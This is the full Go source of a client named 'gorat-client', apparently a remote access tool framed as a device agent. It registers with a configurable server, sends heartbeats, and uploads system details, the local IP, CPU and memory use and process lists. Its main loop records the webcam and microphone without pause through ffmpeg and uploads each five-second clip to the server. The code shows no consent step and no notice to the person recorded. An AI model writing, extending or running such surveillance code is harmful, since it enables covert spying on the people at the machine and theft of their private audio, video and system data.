package main

import (
	"bytes"
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"mime/multipart"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/shirou/gopsutil/v3/cpu"
	"github.com/shirou/gopsutil/v3/mem"
	"github.com/shirou/gopsutil/v3/process"
)

var (
	serverEndpoint = "http://localhost:8000"
	deviceID       = "factory-001"
	configFile     = "gorat_client_config.json"
	osType         string
)

func init() {
	if runtime.GOOS == "windows" {
		osType = "Windows"
	} else {
		osType = "Linux"
	}
}

type ClientConfig struct {
	S3Bucket        string `json:"s3_bucket"`
	VideoUploadURL  string `json:"video_upload_url"`
	VideoUploadKey  string `json:"video_upload_key"`
	InfoUploadURL   string `json:"info_upload_url"`
	InfoUploadKey   string `json:"info_upload_key"`
	UploadExpiresIn int    `json:"upload_expires_in"`
}

type AgentCredentials struct {
	ClientID  string `json:"client_id"`
	ClientKey string `json:"client_key"`
}

type Agent struct {
	serverClient *http.Client
	sessionID    string
	credentials  *AgentCredentials
	clientConfig *ClientConfig
	mu           sync.Mutex
}

var (
	instanceLock   sync.Mutex
	lockFileHandle *os.File
)

func main() {
	flag.StringVar(&serverEndpoint, "server", "http://localhost:8000", "Server endpoint URL")
	flag.StringVar(&deviceID, "device", "factory-001", "Device ID")
	ldflagsOsType := flag.String("os-type", "", "OS type override (Windows/Linux)")
	flag.Parse()

	if *ldflagsOsType != "" {
		osType = *ldflagsOsType
	}

	if !isSingleInstance() {
		log.Println("Another instance is already running")
		os.Exit(0)
	}
	defer releaseLock()

	serverClient := &http.Client{
		Timeout: 30 * time.Second,
	}

	agent := &Agent{
		serverClient: serverClient,
		sessionID:    generateSessionID(),
	}

	if err := agent.loadOrRegisterCredentials(); err != nil {
		log.Fatalf("Failed to load/register credentials: %v", err)
	}

	if err := agent.fetchClientConfig(); err != nil {
		log.Fatalf("Failed to fetch client config: %v", err)
	}

	agent.uploadDeviceInfo()

	go agent.collectAndUploadSystemInfo()
	go agent.recordAndUpload()
	go agent.sendHeartbeat()

	select {}
}

func isSingleInstance() bool {
	lockPath := filepath.Join(os.TempDir(), "gorat-client.lock")
	f, err := os.OpenFile(lockPath, os.O_CREATE|os.O_RDWR, 0600)
	if err != nil {
		log.Printf("Warning: could not open lock file: %v", err)
		return true
	}

	err = tryFileLock(f)
	if err != nil {
		f.Close()
		return false
	}

	lockFileHandle = f
	return true
}

func tryFileLock(f *os.File) error {
	if runtime.GOOS == "windows" {
		// On Windows, try non-blocking exclusive lock via syscall
		// Fallback: check process list
		return checkProcessList()
	}
	// On Unix, use flock via File syscall not available in stdlib,
	// so we use a simpler pid-file approach
	pid := []byte(fmt.Sprintf("%d", os.Getpid()))
	f.Truncate(0)
	f.Seek(0, 0)
	f.Write(pid)
	return nil
}

func checkProcessList() error {
	if osType == "Windows" {
		cmd := exec.Command("cmd", "/c", "tasklist", "/FI", "IMAGENAME eq gorat-client.exe")
		output, err := cmd.Output()
		if err != nil {
			return nil
		}
		lines := strings.Split(string(output), "\n")
		count := 0
		for _, line := range lines {
			if strings.Contains(strings.ToLower(line), "gorat-client.exe") {
				count++
			}
		}
		if count > 1 {
			return fmt.Errorf("already running")
		}
	} else {
		cmd := exec.Command("pgrep", "-x", "gorat-client")
		output, err := cmd.Output()
		if err == nil && len(strings.TrimSpace(string(output))) > 0 {
			pids := strings.Split(strings.TrimSpace(string(output)), "\n")
			selfPid := fmt.Sprintf("%d", os.Getpid())
			otherCount := 0
			for _, pid := range pids {
				if strings.TrimSpace(pid) != selfPid {
					otherCount++
				}
			}
			if otherCount > 0 {
				return fmt.Errorf("already running")
			}
		}
	}
	return nil
}

func releaseLock() {
	if lockFileHandle != nil {
		lockPath := lockFileHandle.Name()
		lockFileHandle.Close()
		os.Remove(lockPath)
	}
}

func (a *Agent) loadOrRegisterCredentials() error {
	if a.tryLoadCredentials() {
		return nil
	}
	return a.registerNewClient()
}

func (a *Agent) tryLoadCredentials() bool {
	data, err := os.ReadFile(configFile)
	if err != nil {
		return false
	}

	var creds AgentCredentials
	if err := json.Unmarshal(data, &creds); err != nil {
		return false
	}

	if creds.ClientID == "" || creds.ClientKey == "" {
		return false
	}

	a.credentials = &creds
	return true
}

func (a *Agent) saveCredentials() error {
	data, err := json.Marshal(a.credentials)
	if err != nil {
		return err
	}
	return os.WriteFile(configFile, data, 0600)
}

func (a *Agent) registerNewClient() error {
	url := serverEndpoint + "/api/client/register"
	data := map[string]interface{}{
		"device_id": deviceID,
		"name":      deviceID,
		"ip":        getLocalIP(),
		"os":        osType,
	}

	resp, err := a.postRequestWithResponse(url, data)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("registration failed with status: %d", resp.StatusCode)
	}

	var result map[string]interface{}
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return fmt.Errorf("failed to decode registration response: %v", err)
	}

	clientID, ok := result["client_id"].(string)
	if !ok || clientID == "" {
		return fmt.Errorf("invalid client_id in registration response")
	}
	clientKey, ok := result["client_key"].(string)
	if !ok || clientKey == "" {
		return fmt.Errorf("invalid client_key in registration response")
	}

	a.credentials = &AgentCredentials{
		ClientID:  clientID,
		ClientKey: clientKey,
	}

	return a.saveCredentials()
}

func (a *Agent) fetchClientConfig() error {
	url := serverEndpoint + "/api/client/config"
	data := map[string]interface{}{
		"client_id":  a.credentials.ClientID,
		"client_key": a.credentials.ClientKey,
	}

	resp, err := a.postRequestWithResponse(url, data)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("config request failed with status: %d", resp.StatusCode)
	}

	var result map[string]interface{}
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return fmt.Errorf("failed to decode config response: %v", err)
	}

	configData, ok := result["config"].(map[string]interface{})
	if !ok {
		configData = result
	}

	getStr := func(m map[string]interface{}, key string) string {
		v, ok := m[key].(string)
		if !ok {
			return ""
		}
		return v
	}
	getInt := func(m map[string]interface{}, key string) int {
		v, ok := m[key].(float64)
		if !ok {
			return 0
		}
		return int(v)
	}

	cfg := &ClientConfig{
		S3Bucket:        getStr(configData, "s3_bucket"),
		VideoUploadURL:  getStr(configData, "video_upload_url"),
		VideoUploadKey:  getStr(configData, "video_upload_key"),
		InfoUploadURL:   getStr(configData, "info_upload_url"),
		InfoUploadKey:   getStr(configData, "info_upload_key"),
		UploadExpiresIn: getInt(configData, "upload_expires_in"),
	}

	if cfg.S3Bucket == "" {
		return fmt.Errorf("missing s3_bucket in config response")
	}

	a.clientConfig = cfg
	return nil
}

func (a *Agent) postRequestWithResponse(url string, data interface{}) (*http.Response, error) {
	jsonData, err := json.Marshal(data)
	if err != nil {
		return nil, err
	}

	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/json")

	return a.serverClient.Do(req)
}

func (a *Agent) sendHeartbeat() {
	for {
		url := serverEndpoint + "/api/client/heartbeat"
		data := map[string]interface{}{
			"device_id": deviceID,
		}
		if err := a.postRequest(url, data); err != nil {
			log.Printf("Heartbeat failed: %v", err)
		}
		time.Sleep(60 * time.Second)
	}
}

func (a *Agent) postRequest(url string, data interface{}) error {
	jsonData, err := json.Marshal(data)
	if err != nil {
		return err
	}

	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")

	resp, err := a.serverClient.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 400 {
		return fmt.Errorf("request to %s failed with status %d", url, resp.StatusCode)
	}
	return nil
}

func generateSessionID() string {
	return fmt.Sprintf("%d", time.Now().UnixNano())
}

func (a *Agent) uploadFile(fileType string, data []byte, filename string) error {
	url := fmt.Sprintf("%s/api/client/upload/%s", serverEndpoint, fileType)

	body := &bytes.Buffer{}
	w := multipart.NewWriter(body)

	w.WriteField("device_id", deviceID)

	fw, err := w.CreateFormFile(fileType, filename)
	if err != nil {
		return err
	}
	if _, err := fw.Write(data); err != nil {
		return err
	}
	w.Close()

	req, err := http.NewRequest("POST", url, body)
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", w.FormDataContentType())

	resp, err := a.serverClient.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 400 {
		return fmt.Errorf("upload failed with status %d", resp.StatusCode)
	}
	return nil
}

func (a *Agent) uploadDeviceInfo() {
	data := map[string]interface{}{
		"device_id":  deviceID,
		"session_id": a.sessionID,
		"start_time": time.Now().Format(time.RFC3339),
		"os":         getOSInfo(),
	}

	url := serverEndpoint + "/api/client/upload/info"
	if err := a.postRequest(url, data); err != nil {
		log.Printf("Failed to upload device info: %v", err)
	}
}

func getOSInfo() string {
	if osType == "Windows" {
		cmd := exec.Command("cmd", "/c", "ver")
		output, err := cmd.Output()
		if err != nil {
			return "Windows"
		}
		return strings.TrimSpace(string(output))
	}
	cmd := exec.Command("uname", "-a")
	output, err := cmd.Output()
	if err != nil {
		return "Linux"
	}
	return strings.TrimSpace(string(output))
}

func getLocalIP() string {
	interfaces, err := net.Interfaces()
	if err != nil {
		return "127.0.0.1"
	}

	for _, iface := range interfaces {
		if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {
			continue
		}

		addrs, err := iface.Addrs()
		if err != nil {
			continue
		}

		for _, addr := range addrs {
			var ip net.IP
			switch v := addr.(type) {
			case *net.IPNet:
				ip = v.IP
			case *net.IPAddr:
				ip = v.IP
			}

			if ip == nil || ip.IsLoopback() {
				continue
			}

			ip = ip.To4()
			if ip == nil {
				continue
			}

			return ip.String()
		}
	}

	return "127.0.0.1"
}

func (a *Agent) collectAndUploadSystemInfo() {
	for {
		cpuPct, err := cpu.Percent(0, false)
		if err != nil || len(cpuPct) == 0 {
			log.Printf("Failed to collect CPU info: %v", err)
			time.Sleep(30 * time.Second)
			continue
		}

		memInfo, err := mem.VirtualMemory()
		if err != nil {
			log.Printf("Failed to collect memory info: %v", err)
			time.Sleep(30 * time.Second)
			continue
		}

		processes, err := process.Processes()
		if err != nil {
			log.Printf("Failed to collect process list: %v", err)
			time.Sleep(30 * time.Second)
			continue
		}

		var procList []map[string]interface{}
		limit := 50
		if len(processes) < limit {
			limit = len(processes)
		}

		for _, p := range processes[:limit] {
			name, _ := p.Name()
			cpuVal, _ := p.CPUPercent()
			memVal, _ := p.MemoryPercent()
			procList = append(procList, map[string]interface{}{
				"pid":  p.Pid,
				"name": name,
				"cpu":  cpuVal,
				"mem":  memVal,
			})
		}

		data := map[string]interface{}{
			"timestamp": time.Now().Unix(),
			"cpu":       cpuPct[0],
			"mem_used":  memInfo.UsedPercent,
			"processes": procList,
			"device_id": deviceID,
		}

		url := serverEndpoint + "/api/client/upload/telemetry"
		if err := a.postRequest(url, data); err != nil {
			log.Printf("Failed to upload telemetry: %v", err)
		}

		time.Sleep(30 * time.Second)
	}
}

func (a *Agent) recordAndUpload() {
	tempDir := filepath.Join(os.TempDir(), "gorat-client")
	os.MkdirAll(tempDir, 0755)

	segmentCounter := 1
	for {
		timestamp := time.Now().Format("2006-01-02_15_04_05")
		segmentFile := filepath.Join(tempDir, fmt.Sprintf("%s_%03d.mp4", timestamp, segmentCounter))

		var cmd *exec.Cmd
		if osType == "Windows" {
			cmd = exec.Command(
				"ffmpeg",
				"-f", "dshow",
				"-i", "video=Integrated Camera:audio=Microphone Array",
				"-c:v", "libx264",
				"-preset", "veryfast",
				"-crf", "23",
				"-c:a", "aac",
				"-b:a", "128k",
				"-t", "5",
				"-y",
				segmentFile,
			)
		} else {
			cmd = exec.Command(
				"ffmpeg",
				"-f", "v4l2",
				"-i", "/dev/video0",
				"-f", "alsa",
				"-i", "default",
				"-c:v", "libx264",
				"-preset", "veryfast",
				"-crf", "23",
				"-c:a", "aac",
				"-b:a", "128k",
				"-t", "5",
				"-y",
				segmentFile,
			)
		}

		if err := cmd.Run(); err != nil {
			log.Printf("ffmpeg execution failed: %v", err)
			time.Sleep(5 * time.Second)
			continue
		}

		data, err := os.ReadFile(segmentFile)
		if err == nil {
			if err := a.uploadFile("video", data, filepath.Base(segmentFile)); err != nil {
				log.Printf("Failed to upload video: %v", err)
			}
		}

		os.Remove(segmentFile)

		segmentCounter++
		if segmentCounter > 999 {
			segmentCounter = 1
		}
	}
}
